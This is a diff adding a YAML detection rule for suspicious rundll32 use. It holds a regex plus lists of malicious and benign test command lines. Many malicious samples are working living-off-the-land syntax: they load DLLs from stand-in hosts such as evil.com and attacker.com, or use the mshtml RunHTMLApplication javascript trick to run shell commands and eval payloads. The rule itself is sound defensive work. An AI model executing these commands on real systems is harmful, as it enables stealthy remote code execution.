@@ -1,0 +1,56 @@
+name: experimental-high-15-rundll32
+severity: high-experimental
+description: >
+  Detects rundll32 executing DLLs downloaded from remote URLs. Living-off-the-land technique for stealthy execution.
+
+pattern: |
+  (?i)rundll32(?:\.exe)?[\s\r\n,]+(?:javascript:|vbscript:|about:|http://|https://|ftp://|[^\r\n]*?(?:C:\\(?:Windows\\Temp|Temp|Users\\[^\\]+\\AppData|Users\\Public|ProgramData)|/tmp)[^\r\n]*?\.dll)|(?:[^\r\n]*?\.dll[,\s]+(?:Execute|EntryPoint|Run|Start|Main|DllMain|DllRegisterServer|Loader|Init|Launch))
+
+malicious:
+  - 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();eval("malicious")'
+  - "rundll32 C:\\Temp\\evil.dll,EntryPoint"
+  - "rundll32.exe C:\\Users\\victim\\AppData\\Local\\Temp\\malware.dll,Start"
+  - "rundll32 http://evil.com/payload.dll"
+  - "rundll32.exe C:\\Windows\\Temp\\backdoor.dll,Run"
+  - 'rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";new ActiveXObject("WScript.Shell").Run("cmd /c malicious")'
+  - "rundll32 C:\\Users\\Public\\Downloads\\trojan.dll,Execute"
+  - "rundll32.exe C:\\ProgramData\\malware.dll,DllMain"
+  - 'rundll32 vbscript:Execute("CreateObject(""WScript.Shell"").Run(""calc.exe"")")(window.close)'
+  - "rundll32.exe C:\\Temp\\clickfix.dll,Loader"
+  - 'rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write("<script>eval(atob(\"base64payload\"))</script>")'
+  - "rundll32.exe C:\\Users\\victim\\AppData\\Roaming\\implant.dll,Init"
+  - "rundll32 C:\\Windows\\Temp\\ransomware.dll,Launch"
+  - 'rundll32.exe about:blank javascript:eval("malicious code")'
+  - "rundll32 /tmp/malware.dll,Execute"
+  - "rundll32.exe C:\\Users\\Public\\dropper.dll,EntryPoint"
+  - 'cmd /c rundll32 javascript:"\..\mshtml,RunHTMLApplication ";window.resizeTo(0,0);eval("evil")'
+  - "rundll32 C:\\ProgramData\\backdoor.dll,Run"
+  - "rundll32.exe https://attacker.com/payload.dll"
+  - "rundll32 C:\\Users\\victim\\AppData\\Local\\Temp\\stage2.dll,Start"
+  - 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.body.innerHTML="<script src=http://evil.com/mal.js></script>"'
+  - "rundll32 C:\\Temp\\persistence.dll,DllRegisterServer"
+  - "rundll32.exe ftp://evil.com/malicious.dll"
+  - "rundll32 C:\\Windows\\Temp\\obfuscated.dll,Main"
+  - "rundll32.exe C:\\Users\\Public\\Documents\\trojan.dll,Execute"
+
+benign:
+  - "rundll32.exe user32.dll,MessageBeep"
+  - "rundll32 shell32.dll,Control_RunDLL"
+  - "rundll32.exe printui.dll,PrintUIEntry"
+  - "rundll32 advapi32.dll,ProcessIdleTasks"
+  - "rundll32.exe C:\\Windows\\System32\\comctl32.dll"
+  - "rundll32 shell32.dll,SHHelpShortcuts_RunDLL"
+  - "rundll32.exe shimgvw.dll,ImageView_Fullscreen"
+  - "rundll32 shell32.dll,OpenAs_RunDLL"
+  - "rundll32.exe iesetup.dll,IEShowHideIcon"
+  - "rundll32 iedkcs32.dll,BrandIE4 SIGNUP"
+  - "rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl"
+  - "rundll32 url.dll,FileProtocolHandler"
+  - "rundll32.exe mshtml.dll,PrintHTML"
+  - "rundll32 dfshim.dll,ShOpenVerbApplication"
+  - "rundll32.exe setupapi.dll,InstallHinfSection"
+  - "rundll32 C:\\Windows\\System32\\cryptext.dll,CryptExtOpenCER"
+  - "rundll32.exe C:\\Windows\\SysWOW64\\shell32.dll,Control_RunDLL"
+  - "rundll32 keymgr.dll,KRShowKeyMgr"
+  - "rundll32.exe C:\\Windows\\System32\\davclnt.dll,DavSetCookie"
+  - "rundll32 C:\\Program Files\\Common Files\\Microsoft Shared\\ink\\tiptsf.dll,RegisterTipTsf"
